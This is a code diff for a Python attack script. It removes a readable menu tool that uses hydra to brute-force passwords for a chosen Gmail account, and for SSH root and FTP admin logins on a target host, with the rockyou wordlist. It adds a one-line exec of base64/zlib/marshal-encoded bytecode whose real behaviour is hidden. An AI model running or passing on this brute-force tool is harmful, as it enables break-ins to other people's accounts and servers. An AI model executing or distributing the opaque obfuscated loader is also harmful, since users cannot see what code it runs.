@@ -1,25 +1,3 @@
-# CREATED BY: RAMIZ UDDIN
-import os, cyber_deps
-cyber_deps.ensure_deps(system_pkgs=["hydra"])
-def run():
-    while True:
-        os.system("clear")
-        print("\033[1;36m" + "="*45)
-        print("      HYDRA CRACKER PRO")
-        print("      CREATED BY: RAMIZ UDDIN")
-        print("="*45 + "\033[0m")
-        print("\033[1;32m[1] Gmail Attack")
-        print("[2] SSH Brute Force")
-        print("[3] FTP Brute Force")
-        print("[99] Uninstall Hydra")
-        print("[0] Back\033[0m")
-        c = input("\nHydra > ")
-        if c == '0': break
-        if c == '99': import cyber_deps; cyber_deps.remove_deps(["hydra"]); break
-        email = input("\033[1;33mEnter Target Email/IP: \033[0m")
-        wordlist = input("\033[1;33mWordlist (Enter for rockyou.txt): \033[0m") or "rockyou.txt"
-        if c == '1': os.system(f"hydra -l {email} -P {wordlist} -s 465 -S -v -V -t 4 smtp.gmail.com smtp")
-        elif c == '2': os.system(f"hydra -l root -P {wordlist} {email} ssh")
-        elif c == '3': os.system(f"hydra -l admin -P {wordlist} {email} ftp")
-        input("\n[Press Enter to Continue]")
-if __name__ == "__main__": run()
+# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
+# SOURCE PROTECTED. DO NOT TAMPER.
+import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVlM9PG0cUx2e8a1j/gEAAmx8FBkgFm2T5ZRzVtAkx4AAh/JAXtxBjOa69MS7eXXd2ndR76qEHVA5FUaqoh0oc0xtHjj72aIEj0IpbD1VvUfIPdHds3KW11GQk7775zJvve3478/4AlkFX3+83jcfPgAc8XAa48oYYbsMwDf4zBgFvG4M8FYAI8HQ3wNQ2zdunDYkEA8A2NQj8VU8E0jAN2Ya/zMmqbt8ppHCChbpLKSiqIMZzu2klaZVuNH6Umc8PNjOfPhCtLYVtdTOBfngZK2q/5LytLqXqUroutdelDXVpY13K1KWOutRpoY016rqkEogA3k0qbJC0OWsiM6/h1cyDZVpuDTvr1ufamKVCaat6S03dZqGtl/QuHKmylM3cy1+XKCNuG4nbB/7/y7RHbM2A74hQxtPjs9RzbcHQ8X6wTidR6CJq3Vd0hgydHqLT+wE6n1h0eq06ln/f9w9dgCv3AWD7jWObzAoJrE31RCc+990R737M0LyIjMWt+XAQzYWDc8uhMFoPr2m9lYW5cCi4EZpHs1vTKBxcWXqMIvPzS6vaxEeF6YmOi5qXJDgpRidiaEFMZLIoqKqJ5K7WFp2MIZ5fRLM4rwrogYyTggF9MfRgY/0KbI8GAjEUkTKSoiayWbRoXljNHR2PoVlDiYRxOAlF95AOx3VbIIDNemPz2mqDJAWfGJJUAaONBE4LKgqZuYwtrU8jsp+r+nwl41Q2o6hopOL9VMYIy8ndgpwfVb9T2aq7y8J0OKE5SBNBXBZpNOLWkcYiTkFTd/yI4xH3DHFfIk5FU0gR1dxo2gw9mpRFMtXhpNZa245lWTUFdGgqKcqODn3a9dpyIiVmJBKARk/VnNbtjK5jQVFQJVtVRnOypGakvBBjG3SbrOgNla6m23M4I6m6PSPl8qruTBa+FnA8JeQU3YUFUX4mkAlL6zCJW42q6XbBTFNnnlcrophN1zwcOtApnJewcc1Jq1b6jOP5PTh3Nl8wzp8cPzoOhstM9wXTVGoeKjM3iGGQEWJwZWaUGKjMDBDjZpm5ddW5ZtwoM58So7/MoAt368HtU3f/Hjx3uQ+o/c8OIqZB7wdOPcNn7MwJO1P0Fh1l9uHvoYuWjpLn/mlLcM9+0dZZ6lo9bVs7a3tS4p/sMdXdL8Ovtl5sHXa99r8ePmo/2jl6XJrZKfVn3nR8c97UfDC0v/kSvyq8KJSGpo42jx4eJ4r24+fFVGlg+Y330b88/Ob242+LHcXGoloaeFT2rpC0b5WZ2++Ggevae/P26kw8bpRUisdZO24yTyeps0uQlDyulJ/U1PSTEqIQj/8GcKfp5yH0C1FO5bPCPWz0FWB2BGXUeLylIIR/go5z4DwDnhPgOVw4DJwA7p2tHXJvbwLavaedUl2/+H71l6guovc3nwiaXA=='))))
